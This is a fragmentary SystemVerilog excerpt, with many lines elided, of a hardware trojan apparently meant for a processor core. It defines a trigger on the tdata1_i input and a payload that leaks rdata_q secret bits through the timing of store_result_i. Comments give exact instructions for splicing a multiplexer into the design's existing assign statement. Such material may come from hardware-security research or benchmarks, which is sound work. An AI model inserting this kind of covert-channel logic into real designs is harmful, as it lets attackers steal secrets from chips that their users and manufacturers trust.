 ...
 *   
 * Trigger: Counter on tdata1_i
 * Payload: Modulate store_result_i timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |tdata1_i) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of store_result_i:
...
logic       covert_bit_out;         // Drives store_result_i when trojan active
...
//   Find the assign for store_result_i (or rd_error_o as fallback):
//     assign store_result_i = <normal_expr>;
//   Replace with:
//     assign store_result_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
